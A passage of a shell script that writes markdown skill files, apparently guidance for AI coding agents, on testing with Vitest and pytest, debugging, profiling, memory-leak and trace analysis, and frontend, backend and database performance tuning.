   - Use `vi.fn()`, `vi.spyOn()`, `vi.mock()`, and `vi.useFakeTimers()`.
   - Restore mocks automatically using `restoreMocks: true` in config.
6. Snapshot Testing with File Previews:
   - Use `toMatchInlineSnapshot()` or file snapshots with clear visual formatting.

## Constraints / Rules
- Never import production code with commonjs `require()` in Vitest ESM files.
- Do not use `test.concurrent` on tests that mutate shared database or global state.
- Ensure in-source testing blocks are purged from production bundles by configuring `define: { 'import.meta.vitest': 'undefined' }` in Vite.

## Workflow
1. Define test configuration in `vitest.config.ts` with pool strategy and path aliases.
2. Author test files matching `*.test.ts` or `*.spec.ts`.
3. Apply `test.concurrent` to parallelizable test blocks.
4. Use `vi.spyOn()` for external boundary mocking.
5. Run in watch mode (`vitest`) during development or single-run in CI (`vitest run`).

## Expected Output
High-speed Vitest test suite running natively in ESM, with shared Vite aliases, concurrent execution, and in-source testing.

## Validation Checklist
- [ ] Are path aliases shared between Vite and Vitest?
- [ ] Is `test.concurrent` used on isolated tests for maximum throughput?
- [ ] Are in-source tests tree-shaken from production builds?
- [ ] Are mocks restored automatically between test runs?
- [ ] Does CI execute with `vitest run` in under a few seconds?

## Common Mistakes & Antipatterns
- Re-implementing path aliases separately in Jest and Vite configs, causing tests to pass while the build fails or vice-versa.
- Running state-mutating integration tests concurrently, causing race conditions in database assertions.
- Leaving `import.meta.vitest` blocks un-shaken in production web bundles.

## Concrete Real-World Example
Scenario: A large TypeScript web app takes 90 seconds to run unit tests in Jest due to ts-jest transpilation overhead.
Prompt: Migrate this test suite from Jest to Vitest and optimize execution speed.
Application: The AI creates a unified `vitest.config.ts` sharing Vite plugins, replaces `jest.` APIs with `vi.`, flags independent mathematical unit tests with `test.concurrent`, and reduces full test suite execution time from 90 seconds to 4.2 seconds.
EOF

cat << 'EOF' > skills/testing/pytest/fixtures-and-parameterization/SKILL.md
---
name: "pytest-fixtures-and-parameterization"
description: "Architecting clean, modular Python test suites using Pytest fixtures, hierarchical scopes, yield teardowns, parameterization, and property-based testing."
category: "testing"
subcategory: "pytest"
language: "python"
framework: "pytest"
technology: "pytest"
difficulty: "intermediate"
tags: ["testing", "python", "pytest", "fixtures", "parameterize", "test-architecture"]
---

# Pytest Fixture Architecture, Scopes, and Parameterization

## Purpose
Provide AI agents with standards for writing clean, modular Python test suites utilizing Pytest fixture dependency injection, scoped resources, and exhaustive table-driven parameterization.

## When to Use
Use when testing Python microservices, data processing pipelines, machine learning models, or Django/FastAPI applications.

## Inputs / Context
Python functions, classes, database connections, test data permutations, and teardown requirements.

## Instructions
1. Structure test fixtures hierarchically using `conftest.py` files placed at appropriate directory levels:
   - Root `conftest.py`: Global fixtures (database engine, mock servers, environment variables).
   - Subdirectory `conftest.py`: Feature-specific fixtures (scoped models, authenticated user sessions).
2. Configure Fixture Scopes appropriately to maximize performance:
   - `scope="function"` (default): Fresh instance per test for stateful, mutable objects.
   - `scope="module"` or `scope="session"`: Shared instance for expensive, read-only resources (e.g., containerized database connection pools, ML model weights).
3. Use Yield Fixtures for safe teardown:
   - Code before `yield`: Setup phase.
   - `yield resource`: Injected into the test.
   - Code after `yield`: Teardown phase (guaranteed to execute even if the test fails).
4. Exhaustive Parameterization via `@pytest.mark.parametrize`:
   - Replace repetitive test functions with a single parameterized test function testing multiple input/output tuples.
   - Provide descriptive IDs using the `ids` parameter or custom ID generators for readable test reports.
5. Use `tmp_path` fixture for temporary file operations (automatically cleaned up by Pytest).
6. Use `monkeypatch` fixture for safe environment variable and configuration overrides without permanent state pollution.
7. Mark slow tests (`@pytest.mark.slow`) and integration tests (`@pytest.mark.integration`) to support fast unit test runs (`pytest -m "not slow"`).

## Constraints / Rules
- Never use Python's built-in `unittest.TestCase` class hierarchy in new Pytest codebases; use plain functions and fixtures.
- Never write setup/teardown code in `try...finally` inside tests; use yield fixtures.
- Avoid mutating session-scoped fixtures within individual tests.

## Workflow
1. Define shared fixtures in `conftest.py` with yield teardown blocks.
2. Group test cases by domain feature.
3. Apply `@pytest.mark.parametrize` for boundary value testing.
4. Execute tests via `pytest -v --durations=10` to identify slow tests.
5. Verify clean state resets across tests.

## Expected Output
Clean Pytest test suite featuring conftest fixture architecture, yield teardowns, parameterization tables, and marker tags.

## Validation Checklist
- [ ] Are fixtures organized logically in `conftest.py` files?
- [ ] Are teardowns implemented reliably using yield fixtures?
- [ ] Are parameterization tables used to test multiple input/output pairs?
- [ ] Are expensive resources scoped to `session` or `module`?
- [ ] Does `monkeypatch` manage environment variable overrides?

## Common Mistakes & Antipatterns
- Re-initializing an expensive database connection pool in every single test function instead of using a `session`-scoped fixture.
- Mutating a `session`-scoped fixture in test 1, causing test 2 to fail due to corrupted shared state.
- Writing 10 nearly identical test functions instead of a single `@pytest.mark.parametrize` table.

## Concrete Real-World Example
Scenario: A Python data validation module has 20 copy-pasted test functions testing various valid and invalid phone number formats, making test maintenance tedious.
Prompt: Refactor these repetitive phone validation tests into an idiomatic, parameterized Pytest suite.
Application: The AI creates a single test function decorated with `@pytest.mark.parametrize("phone, expected_valid, error_code", [...])` covering all 20 cases with clear test IDs, reducing lines of code by 80% while improving test reporting clarity.
EOF

cat << 'EOF' > skills/debugging/errors/stack-trace-and-root-cause-analysis/SKILL.md
---
name: "stack-trace-and-root-cause-analysis"
description: "Systematic methodology for analyzing complex multi-threaded and asynchronous stack traces, isolating root causes, and formulating minimal bug reproductions."
category: "debugging"
subcategory: "errors"
language: "agnostic"
framework: "none"
technology: "debugging"
difficulty: "intermediate"
tags: ["debugging", "stack-trace", "root-cause", "errors", "troubleshooting", "reproduction"]
---

# Stack Trace Analysis and Root Cause Isolation

## Purpose
Equip AI agents with a methodical debugging framework to dissect complex stack traces, trace asynchronous execution boundaries, and identify the root cause behind production errors.

## When to Use
Use when diagnosing unhandled exceptions, analyzing production crash reports (Sentry, Datadog), or debugging failing CI test pipelines.

## Inputs / Context
Raw stack trace, error message, environment details, relevant source code files, and user action sequence.

## Instructions
1. Parse the Stack Trace Top-Down and Bottom-Up:
   - Exception Type and Message: Understand the exact assertion or runtime violation (e.g., `TypeError: Cannot read properties of undefined (reading 'map')`).
   - Deepest Application Frame: Locate the first frame in the stack trace belonging to application source code (ignoring framework and runtime library frames like Express or React internals).
   - Entrypoint Frame: Locate the originating HTTP request, event listener, or message handler frame at the bottom of the trace.
2. Trace the Async Boundary:
   - In asynchronous runtimes (Node.js, Python asyncio), recognize where the stack trace breaks across tick boundaries.
   - Inspect Promise chains and async/await suspension points.
3. Formulate the Failure Hypothesis:
   - Identify which variable was in an unexpected state (null, undefined, uninitialized, empty).
   - Formulate a falsifiable hypothesis explaining why that variable reached that state.
4. Construct a Minimal Reproducible Example (MRE):
   - Strip away unrelated UI components, database tables, and middleware.
   - Write a single failing test case that triggers the exact same stack trace and error message.
5. Implement the Fix at the Root:
   - Fix the underlying state invalidity rather than merely slapping a defensive null check (`foo?.bar`) that masks the bug and leaves system state corrupted.
6. Verify the failing test passes and ensure no regressions are introduced.

## Constraints / Rules
- Never apply band-aid null-checks (`if (!x) return;`) without understanding why `x` was null.
- Do not conclude investigation based on guesswork; always verify against the stack frame line numbers.
- Avoid modifying multiple unrelated files simultaneously during bug isolation.

## Workflow
1. Extract and sanitize stack trace.
2. Map line numbers to source control commit revision.
3. Isolate the exact failing statement.
4. Write a minimal reproduction test case reproducing the failure.
5. Fix the root cause and verify test passes.

## Expected Output
Root cause analysis report detailing the failure mechanism, minimal reproduction test, and clean permanent bug fix.

## Validation Checklist
- [ ] Is the deepest application source code frame identified?
- [ ] Is the exact failing variable and state documented?
- [ ] Is a minimal failing test written before applying the fix?
- [ ] Does the fix resolve the underlying root cause rather than masking the symptom?
- [ ] Does the reproduction test pass after the fix is applied?

## Common Mistakes & Antipatterns
- Slapping optional chaining (`user?.profile?.address?.zip`) on a variable, hiding the fact that the database query failed to load the user profile entirely.
- Getting confused by framework internal frames (like React fiber or Node.js internal stream frames) instead of focusing on user application code.
- Assuming the error happened on the line where the exception was thrown, rather than 10 steps earlier where bad data was ingested.

## Concrete Real-World Example
Scenario: A Node.js backend throws `TypeError: Cannot read properties of undefined (reading 'status')` deep inside an order processing worker.
Prompt: Analyze this stack trace and find the root cause of the crash.
Application: The AI analyzes the trace, determines that `order.payment` is undefined because an upstream webhook failed to create the payment record before emitting the processing event, creates a reproduction test with a payment-less order, and implements transactional order-payment creation to fix the root cause.
EOF

cat << 'EOF' > skills/debugging/performance/bottleneck-profiling-analysis/SKILL.md
---
name: "bottleneck-profiling-analysis"
description: "Profiling CPU consumption, analyzing flame graphs, measuring execution wall-clock time vs CPU time, and isolating algorithmic bottlenecks."
category: "debugging"
subcategory: "performance"
language: "agnostic"
framework: "none"
technology: "profiling"
difficulty: "advanced"
tags: ["debugging", "performance", "profiling", "flame-graphs", "cpu-bottlenecks", "tracing"]
---

# Application Performance Profiling and CPU Bottleneck Analysis

## Purpose
Instruct AI agents to methodically analyze CPU profiles and flame graphs, distinguish between I/O wait and CPU saturation, and pinpoint the exact functions consuming processor cycles.

## When to Use
Use when diagnosing high CPU utilization, sluggish API response times, dropped animation frames, or slow batch data processing.

## Inputs / Context
CPU profile data (`.cpuprofile`, pprof, flamegraph), execution traces, hardware specifications, and workload parameters.

## Instructions
1. Differentiate Wall-Clock Time vs. CPU Time:
   - Wall-Clock Time: Total elapsed duration (includes network I/O wait, disk wait, thread sleeping).
   - CPU Time: Time the processor spent actively executing code instructions.
   - If Wall-Clock >> CPU: The bottleneck is external I/O, database latency, or thread locking.
   - If Wall-Clock ≈ CPU: The bottleneck is computational (CPU-bound algorithm, serialization, regex).
2. Interpret Flame Graphs:
   - X-axis: Represents population percentage of sample time (wider rectangles consume more time; order on X-axis is alphabetical/lexical, NOT chronological).
   - Y-axis: Represents call stack depth (root at the bottom, leaf functions at the top).
   - Look for wide 'plateaus' at the top of stacks: these represent leaf functions actively monopolizing CPU time.
3. Identify Common CPU Bottlenecks:
   - Inefficient regular expressions triggering catastrophic backtracking (ReDoS).
   - Excessive JSON serialization/deserialization of massive payloads.
   - Cryptographic hashing executed synchronously on main execution threads.
   - Repeated memory allocations triggering aggressive Garbage Collection (GC) pauses.
4. Measure with Precision:
   - Use high-resolution monotonic clocks (`performance.now()`, `time.perf_counter_ns()`); never use wall-clock system time (`Date.now()`) for micro-benchmarks.
5. Validate optimization with before-and-after benchmark comparisons.

## Constraints / Rules
- Never optimize based on intuition without empirical profile measurements.
- Do not benchmark in debug/development mode; always profile optimized production builds.
- Avoid testing micro-benchmarks without warmup phases to account for JIT compilation.

## Workflow
1. Capture CPU profile under realistic production-scale load.
2. Generate and inspect the flame graph to find wide plateaus.
3. Determine whether the bottleneck is I/O-bound or CPU-bound.
4. Formulate targeted optimization on the hot path.
5. Re-profile to confirm reduction in CPU time and plateau width.

## Expected Output
Performance profiling diagnosis identifying the hot path function, flame graph interpretation, and verified code optimization.

## Validation Checklist
- [ ] Is CPU profile captured under realistic representative load?
- [ ] Is wall-clock time distinguished from active CPU time?
- [ ] Is the hot path leaf function isolated from the flame graph?
- [ ] Are high-resolution monotonic timers used for benchmarking?
- [ ] Does before/after profiling verify measurable CPU reduction?

## Common Mistakes & Antipatterns
- Spending days optimizing a database query when the flame graph reveals that 85% of request time was spent in a slow JSON serialization library.
- Benchmarking with small datasets (10 items) where algorithmic complexity differences (O(n) vs O(n²)) are completely masked by JIT startup overhead.
- Reading flame graph X-axis as chronological time instead of total aggregated sample percentage.

## Concrete Real-World Example
Scenario: An API endpoint consuming 100% CPU on all Kubernetes pods under modest traffic of 50 requests/sec.
Prompt: Profile this Node.js API endpoint and identify the CPU bottleneck.
Application: The AI analyzes the `.cpuprofile` flame graph, identifies a wide plateau in an unanchored regex validating email addresses (`^([a-zA-Z0-9_\-\.]+)@...`), diagnoses catastrophic backtracking (ReDoS) on malformed inputs, replaces it with a linear parser, reducing CPU usage from 100% to 4%.
EOF

cat << 'EOF' > skills/debugging/crashes/memory-leak-and-heap-dump-investigation/SKILL.md
---
name: "memory-leak-and-heap-dump-investigation"
description: "Diagnosing memory leaks, analyzing V8/JVM heap dumps, tracing retainers trees, and eliminating uncollected object references."
category: "debugging"
subcategory: "crashes"
language: "agnostic"
framework: "none"
technology: "memory-management"
difficulty: "advanced"
tags: ["debugging", "memory-leaks", "heap-dumps", "garbage-collection", "v8", "jvm", "crashes"]
---

# Memory Leak Investigation and Heap Dump Analysis

## Purpose
Provide AI agents with concrete techniques for analyzing heap dumps, identifying memory leaks, tracing object retainers to GC roots, and resolving Out-Of-Memory (OOM) crashes.

## When to Use
Use when services experience creeping memory growth over time, frequent Garbage Collection thrashing, or fatal Out-Of-Memory (`kill -9`, SIGKILL) termination.

## Inputs / Context
Heap snapshots (`.heapsnapshot`, `.hprof`), memory timeline graphs, process restart logs, and source code.

## Instructions
1. Differentiate Natural Memory Growth from Real Memory Leaks:
   - Normal Growth: Memory rises, but drops back down after major Garbage Collection (sawtooth pattern).
   - Memory Leak: The baseline memory floor continually rises after each GC cycle, eventually exhausting heap limits.
2. Capture Heap Snapshots:
   - Capture Snapshot 1: Baseline immediately after application initialization and warmup.
   - Capture Snapshot 2: Under active workload.
   - Capture Snapshot 3: After workload has ceased and system is idle.
3. Compare Snapshots (The 3-Snapshot Technique):
   - Compare Snapshot 3 against Snapshot 1. Any objects allocated between Snapshot 1 and 2 that still exist in Snapshot 3 are leaked objects.
4. Inspect the Retainers Tree:
   - Identify the leaked object constructor with the highest Retained Size (amount of memory freed if this object were deleted).
   - Trace the Retainer Path upward to the Garbage Collection (GC) Root to discover why the garbage collector is unable to reclaim it.
5. Common Leak Vectors:
   - Global Caches: Unbounded Maps or objects used as in-memory caches without size caps or LRU eviction.
   - Forgotten Event Listeners: Registering listeners on long-lived objects (e.g., `process.on`, `window.addEventListener`) without removing them on component unmount.
   - Closures: Outer function variables captured unintentionally by long-lived inner callback functions.
   - Timers: `setInterval` running forever referencing out-of-scope variables.
6. Apply the Fix: Sever the retainer reference (e.g., clear intervals, remove listeners, use `WeakMap`/`WeakSet`).

## Constraints / Rules
- Never guess where memory is leaking without comparing heap snapshots.
- Do not invoke manual garbage collection (`global.gc()`) in production application code.
- Avoid using unbounded global collections for caching.

## Workflow
1. Monitor process memory RSS and Heap Used over a 24-hour cycle.
2. Trigger heap snapshots at baseline and post-load states.
3. Load snapshots into Chrome DevTools Memory tab or Eclipse MAT.
4. Filter by objects allocated between Snapshots 1 and 2.
5. Trace the retainer chain to the GC root.
6. Refactor code to sever references and verify memory stability in post-fix snapshot.

## Expected Output
Memory leak diagnostic report identifying the retaining GC root, retained byte size, and code refactor eliminating the leak.

## Validation Checklist
- [ ] Is creeping memory growth verified over multiple GC cycles?
- [ ] Are before-and-after heap snapshots compared?
- [ ] Is the retaining path traced all the way to a GC root?
- [ ] Are unbounded caches replaced with bounded LRU caches or WeakMaps?
- [ ] Does memory return to baseline after workload completion in the patched build?

## Common Mistakes & Antipatterns
- Confusing Shallow Size (memory held by the object itself) with Retained Size (total memory kept alive by the object's reference tree).
- Increasing container memory limits (e.g., doubling Kubernetes pod RAM) instead of fixing the leak, which merely delays the inevitable OOM crash by a few hours.
- Creating a cache using a plain JavaScript `new Map()` without a max size limit or eviction policy.

## Concrete Real-World Example
Scenario: A Node.js websocket gateway crashes with `JavaScript heap out of memory` every 3 days.
Prompt: Inspect this heap snapshot and find the memory leak.
Application: The AI compares baseline and 48-hour heap dumps, discovers 300,000 `EventEmitter` listener closures retained by a global `telemetryService` instance, identifies that sockets failed to call `removeListener('message')` upon disconnect, and fixes the disconnect cleanup hook, stabilizing heap memory at 45MB.
EOF

cat << 'EOF' > skills/debugging/troubleshooting/distributed-trace-investigation/SKILL.md
---
name: "distributed-trace-investigation"
description: "Troubleshooting distributed microservice failures and latency anomalies using OpenTelemetry, W3C Trace Context, span hierarchy analysis, and log correlation."
category: "debugging"
subcategory: "troubleshooting"
language: "agnostic"
framework: "none"
technology: "opentelemetry"
difficulty: "advanced"
tags: ["debugging", "troubleshooting", "distributed-tracing", "opentelemetry", "microservices", "latency"]
---

# Distributed Trace Analysis and Microservice Troubleshooting

## Purpose
Instruct AI agents to troubleshoot cross-service failures and latency bottlenecks in distributed architectures by following trace IDs, span cascades, and correlated logs.

## When to Use
Use when an end-to-end request traverses multiple microservices, queues, and databases, and suffers from unexplained latency or cascading 500 errors.

## Inputs / Context
Trace ID, distributed trace span JSON (Jaeger, Zipkin, Datadog), service topology map, and correlated log streams.

## Instructions
1. Propagate W3C Trace Context across all boundaries:
   - Ensure the `traceparent` HTTP header (`00-{trace-id}-{parent-span-id}-{trace-flags}`) is propagated across all inter-service HTTP, gRPC, and messaging queue hops.
2. Analyze the Distributed Trace Span Waterfall:
   - Identify the Root Span (the initial entrypoint request) and total duration.
   - Locate the Critical Path: the sequence of dependent spans that directly determines total wall-clock execution time.
   - Differentiate Serial vs Parallel Spans: spans starting at identical timestamps represent concurrent execution; staggered sequential spans represent blocking dependencies.
3. Diagnose Latency Anomalies:
   - Network Transit Gaps: Compare the completion time of a client span with the start time of the downstream server child span to identify network/queue latency.
   - Database/Cache Bottlenecks: Inspect database client spans for high execution times or repeated identical queries (N+1 query cascades in microservices).
4. Correlate Traces with Structured Logs:
   - Use the `trace_id` and `span_id` embedded in structured log entries to pull all log statements across all services involved in that exact transaction.
5. Identify Failure Origins:
   - In a cascade of 500 errors across 4 microservices, trace downward to the deepest child span marked with `status.code = ERROR` to isolate the originating root failure.

## Constraints / Rules
- Never drop the `traceparent` context header when making outbound HTTP or RPC calls in microservices.
- Do not log unstructured text without injecting the active `trace_id`.
- Avoid creating manual spans for trivial in-memory functions; instrument architectural boundaries.

## Workflow
1. Retrieve the trace waterfall using the transaction `trace_id`.
2. Trace the critical path from root to leaf spans.
3. Identify the span with the highest self-time (total time minus child span durations).
4. Pull correlated service logs matching the failing span ID.
5. Remediate the bottleneck or root failure in the originating microservice.

## Expected Output
Distributed trace diagnosis report detailing the critical path, latency breakdown per service, and root cause failure analysis.

## Validation Checklist
- [ ] Is W3C Trace Context (`traceparent`) verified across all service hops?
- [ ] Is the critical path identified in the span waterfall?
- [ ] Is the deepest originating error span isolated from downstream cascades?
- [ ] Are service logs correlated with `trace_id` and `span_id`?
- [ ] Is network transit time separated from service execution time?

## Common Mistakes & Antipatterns
- Blaming the edge API Gateway for a 5-second timeout when the distributed trace shows that 4.8 seconds were spent waiting on a downstream inventory service database lock.
- Breaking trace context propagation when dispatching background tasks via message queues (Kafka, RabbitMQ), resulting in fragmented, disconnected traces.
- Sifting through millions of logs searching for keywords instead of filtering by the exact transaction `trace_id`.

## Concrete Real-World Example
Scenario: A checkout request takes 8 seconds and intermittently fails with HTTP 504. The web team blames the order service, while the order team blames the payment team.
Prompt: Inspect this OpenTelemetry trace waterfall and determine which service is causing the checkout delay.
Application: The AI analyzes the trace waterfall, observes that the order service called an internal fraud-check microservice sequentially 12 times instead of in parallel, accounting for 7.2 seconds of the 8-second total, pinpointing the exact batching bug in the order service.
EOF

cat << 'EOF' > skills/performance/frontend/core-web-vitals-optimization/SKILL.md
---
name: "core-web-vitals-optimization"
description: "Systematic optimization of Google Core Web Vitals: Largest Contentful Paint (LCP < 2.5s), Interaction to Next Paint (INP < 200ms), and Cumulative Layout Shift (CLS < 0.1)."
category: "performance"
subcategory: "frontend"
language: "agnostic"
framework: "none"
technology: "web-vitals"
difficulty: "advanced"
tags: ["performance", "frontend", "core-web-vitals", "lcp", "inp", "cls", "lighthouse"]
---

# Core Web Vitals Optimization (LCP, INP, CLS)

## Purpose
Provide AI agents with concrete engineering techniques for optimizing frontend web applications to consistently achieve 'Good' thresholds across all three Google Core Web Vitals.

## When to Use
Use when optimizing page load speed, improving SEO rankings, eliminating layout jumping, or resolving unresponsive UI interactions.

## Inputs / Context
Lighthouse audit report, Web Vitals field telemetry, page DOM structure, network waterfalls, and CSS stylesheets.

## Instructions
1. LARGEST CONTENTFUL PAINT (LCP) Optimization (Target: <= 2.5s):
   - Identify the LCP element (usually a hero image, video poster, or large heading).
   - Ensure the LCP resource is discovered immediately in the raw HTML response: never lazy-load (`loading="lazy"`) the LCP image.
   - Preload the LCP image in `<head>`: `<link rel="preload" fetchpriority="high" as="image" href="..." type="image/webp">`.
   - Eliminate render-blocking CSS and JavaScript by inlining critical CSS and deferring non-essential scripts (`defer` or `type="module"`).
   - Use modern image formats (AVIF or WebP) with responsive `srcset` sizing.
2. INTERACTION TO NEXT PAINT (INP) Optimization (Target: <= 200ms):
   - Break up Long Tasks (> 50ms) that monopolize the main thread.
   - Yield to the main thread during heavy operations using `scheduler.yield()` or `setTimeout(..., 0)`.
   - Provide immediate visual feedback: update UI state optimistically within 16ms before launching heavy computations or network calls.
   - Debounce rapid inputs and offload heavy data filtering/sorting to Web Workers.
3. CUMULATIVE LAYOUT SHIFT (CLS) Optimization (Target: <= 0.1):
   - Always include explicit `width` and `height` attributes or CSS `aspect-ratio` on all `<img>`, `<video>`, and `<iframe>` elements to reserve layout space before download.
   - Reserve space for dynamic content (advertisements, banners, cookie notices) using minimum height containers (`min-height`).
   - Use `font-display: optional` or size-adjust font overrides to prevent layout shifts during custom web font swaps (FOUT/FOIT).
   - Never inject new content above existing content unless responding directly to a deliberate user interaction.

## Constraints / Rules
- Never apply `loading="lazy"` to the above-the-fold hero / LCP image.
- Avoid importing entire monolithic utility libraries (e.g., full lodash or moment.js) into client bundles.
- Do not animate layout-triggering properties (`width`, `height`, `top`, `margin`); animate composite-only properties (`transform`, `opacity`).

## Workflow
1. Run Lighthouse and Chrome DevTools Performance panel.
2. Identify LCP element, INP long-task triggers, and CLS shifting elements.
3. Apply preloading and fetchpriority to LCP image.
4. Add aspect-ratio dimensions to media and ad slots.
5. Break up JavaScript long tasks to achieve INP < 200ms.
6. Verify against Web Vitals extension and Lighthouse CI.

## Expected Output
Optimized HTML, CSS, and JavaScript code achieving Green Core Web Vitals scores (LCP <= 2.5s, INP <= 200ms, CLS <= 0.1).

## Validation Checklist
- [ ] Is LCP image preloaded with `fetchpriority="high"` and NOT lazy-loaded?
- [ ] Do all images and media containers have explicit aspect-ratio or dimensions?
- [ ] Are all long tasks (> 50ms) broken up with main-thread yielding?
- [ ] Is font swapping configured to prevent layout shifts?
- [ ] Does Lighthouse report 90+ performance with zero red vital metrics?

## Common Mistakes & Antipatterns
- Adding `loading="lazy"` to every `<img>` on the page including the hero banner, delaying LCP by several seconds.
- Dynamically inserting an alert banner at the top of the page after 2 seconds, pushing the entire page down and causing a massive 0.4 CLS penalty.
- Running a heavy synchronous data sort on an input change event, causing the browser to freeze and failing INP.

## Concrete Real-World Example
Scenario: An e-commerce product page scores 45 on Lighthouse with an LCP of 5.8s and a CLS of 0.35 due to unreserved ad banners and delayed hero images.
Prompt: Optimize this product page to achieve green Core Web Vitals.
Application: The AI removes `loading="lazy"` from the hero image, adds `<link rel="preload" fetchpriority="high">`, sets `aspect-ratio: 16/9` on all product gallery containers, wraps dynamic marketing slots in fixed-height placeholder containers, and defers tracking scripts, lowering LCP to 1.8s and CLS to 0.02.
EOF

cat << 'EOF' > skills/performance/backend/throughput-and-latency-tuning/SKILL.md
---
name: "throughput-and-latency-tuning"
description: "Tuning backend service throughput and latency through asynchronous non-blocking I/O, thread pool right-sizing, connection reuse, and response streaming."
category: "performance"
subcategory: "backend"
language: "agnostic"
framework: "none"
technology: "backend-performance"
difficulty: "advanced"
tags: ["performance", "backend", "throughput", "latency", "connection-pooling", "keep-alive"]
---

# Backend Throughput and Latency Optimization

## Purpose
Provide AI agents with concrete architectural optimizations for maximizing requests-per-second (RPS) throughput and minimizing P95/P99 latency in backend services.

## When to Use
Use when scaling microservices, preparing for high-traffic events (flash sales), reducing infrastructure server costs, or tuning API gateways.

## Inputs / Context
Current RPS, P50/P95/P99 latency metrics, CPU/memory saturation levels, connection pool settings, and downstream dependencies.

## Instructions
1. Measure P95 and P99 Latency: Never rely on average (mean) latency; averages obscure severe latency spikes suffered by tail percentiles.
2. Enable HTTP Keep-Alive and Connection Pooling:
   - Always reuse TCP sockets across HTTP requests to downstream services and databases (`keepAlive: true`).
   - Establishing a new TLS handshake on every outbound request adds 50-150ms of needless latency per call.
3. Optimize Database Connection Pools:
   - Size connection pools accurately using Little's Law and thread count formulas: `pool_size = (core_count * 2) + effective_spindle_count`.
   - Avoid oversized connection pools: having 500 database connections for 4 CPU cores causes massive CPU context-switching overhead and degrades performance.
4. Parallelize Independent Operations:
   - When an endpoint requires data from multiple independent services or queries, execute them concurrently (`Promise.all()`, `asyncio.gather()`, or goroutines) rather than sequentially.
5. Implement Response Compression:
   - Enable Brotli or Gzip compression on JSON and text payloads above 1KB; disable compression for payloads under 1KB where compression overhead exceeds bandwidth gains.
6. Stream Large Payloads:
   - Stream large JSON arrays or file exports directly to the client rather than buffering the entire multi-megabyte payload into server RAM.
7. Optimize JSON Serialization:
   - Use fast JSON serializers (e.g., `fast-json-stringify` in Node, `orjson` in Python) on hot API paths.

## Constraints / Rules
- Never create new HTTP client or database pool instances per request; pools must be long-lived singletons.
- Avoid setting unbounded connection pool maximums.
- Do not compress small responses (< 1KB) or already compressed binary assets (JPEG, PNG, Gzip).

## Workflow
1. Run baseline load tests (using k6 or wrk) recording P50, P95, and P99 latency.
2. Enable HTTP keep-alive and connection reuse on all outbound clients.
3. Convert sequential downstream calls into parallel operations.
4. Tune database connection pool sizes based on core counts.
5. Re-run load tests to verify increased RPS and lowered P99 tail latency.

## Expected Output
High-throughput backend configuration featuring connection pooling, parallel downstream calls, fast serialization, and verified P99 latency reductions.

## Validation Checklist
- [ ] Are P95 and P99 percentiles tracked and reduced?
- [ ] Is HTTP Keep-Alive active on all outbound HTTP/RPC clients?
- [ ] Are independent downstream queries executed concurrently?
- [ ] Are database connection pools sized properly without context-switching bloat?
- [ ] Are large responses streamed without full memory buffering?

## Common Mistakes & Antipatterns
- Instantiating a new database connection client inside the route handler on every incoming request, exhausting sockets and causing 100ms connection delays.
- Executing 4 independent database queries sequentially with `await` when they could have been executed in parallel with `Promise.all()`.
- Setting database connection pool size to 1,000 connections, causing PostgreSQL to thrash in lock contention and crash under load.

## Concrete Real-World Example
Scenario: An API gateway endpoint takes 450ms P95 latency because it makes three sequential HTTP calls to user, billing, and permission services, creating new HTTP connections each time.
Prompt: Optimize this backend API gateway route for high throughput and lower latency.
Application: The AI configures an `http.Agent` with `keepAlive: true` and a max socket pool, launches all three microservice fetches concurrently via `Promise.all()`, and applies Brotli compression, dropping P95 latency from 450ms to 95ms and quadrupling maximum throughput.
EOF

cat << 'EOF' > skills/performance/database/slow-query-remediation/SKILL.md
---
name: "slow-query-remediation"
description: "Systematic remediation of database slow queries, eliminating sequential scans, reducing lock wait times, optimizing pagination, and partitioning large tables."
category: "performance"
subcategory: "database"
language: "sql"
framework: "none"
technology: "database-tuning"
difficulty: "advanced"
tags: ["performance", "database", "slow-queries", "indexing", "keyset-pagination", "partitioning"]
---

# Database Slow Query Remediation and Lock Contention Reduction

## Purpose
Instruct AI agents to systematically diagnose, refactor, and index slow database queries, replace slow offset pagination, and reduce lock contention.

## When to Use
Use when database CPU reaches 100%, queries appear in the database slow query log, or table growth causes queries to slow down exponentially.

## Inputs / Context
Slow query log entry, execution duration, table schema, volume/row count, and existing indexes.

## Instructions
1. Triage Slow Query Logs:
   - Identify queries with high execution frequency and high total time (`pg_stat_statements` in Postgres or MySQL Slow Query Log).
   - Differentiate between a fast query executed 10,000 times (N+1 problem) and a single query taking 30 seconds.
2. Replace Offset Pagination with Keyset (Cursor) Pagination:
   - Avoid `OFFSET 100000 LIMIT 20`: the database must scan and discard 100,000 rows before returning 20 rows, leading to catastrophic degradation on deep pages.
   - Use Keyset Pagination: `WHERE (created_at, id) < (:last_created_at, :last_id) ORDER BY created_at DESC, id DESC LIMIT 20`. This performs an instant O(1) index seek regardless of page depth.
3. Optimize Subqueries and Joins:
   - Convert correlated subqueries to `JOIN` or window functions.
   - Ensure foreign key columns in `JOIN ... ON` conditions are indexed on both tables.
4. Eliminate Table-Scan Filter Predicates:
   - Remove wildcard-prefixed `LIKE '%term'` searches from relational queries; use Full-Text Search (PostgreSQL `tsvector` with GIN index) instead.
5. Partition Massive Tables (> 50 Million Rows):
   - Implement Table Partitioning (declarative partitioning by range or list, e.g., partitioning audit logs or transactions by month/year).
   - Ensure queries utilize Partition Pruning by filtering on the partition key.
6. Reduce Lock Contention:
   - Read uncommitted snapshots where appropriate or use `SKIP LOCKED` for queue/worker job retrieval (`SELECT ... FOR UPDATE SKIP LOCKED`).

## Constraints / Rules
- Never use deep `OFFSET` pagination on large tables in production.
- Do not perform leading wildcard searches (`LIKE '%keyword'`) on standard B-Tree indexes.
- Avoid large unbounded `UPDATE` or `DELETE` operations; batch updates into chunks of 1,000 rows.

## Workflow
1. Identify top offending queries using `pg_stat_statements`.
2. Run `EXPLAIN (ANALYZE, BUFFERS)` to locate sequential scans or sorting bottlenecks.
3. Replace offset pagination with keyset cursor pagination.
4. Add composite covering indexes matching filter and sort order.
5. Verify execution time reduction and absence of disk sort spills.

## Expected Output
Optimized SQL query, replacement of offset pagination with cursor pagination, and targeted index creation DDL.

## Validation Checklist
- [ ] Is deep offset pagination replaced with keyset cursor pagination?
- [ ] Are all foreign keys and join conditions indexed?
- [ ] Are leading wildcard `LIKE '%...'` searches replaced with full-text search?
- [ ] Does `EXPLAIN ANALYZE` confirm an index seek with zero sequential scans?
- [ ] Is query execution time reduced to within SLA (< 50ms)?

## Common Mistakes & Antipatterns
- Using `LIMIT 25 OFFSET 500000`, forcing the database engine to read half a million rows from disk just to throw them away.
- Running a bulk `DELETE FROM logs WHERE created_at < NOW() - INTERVAL '30 days'` on a 100-million row table in one go, locking the table and filling the transaction log.
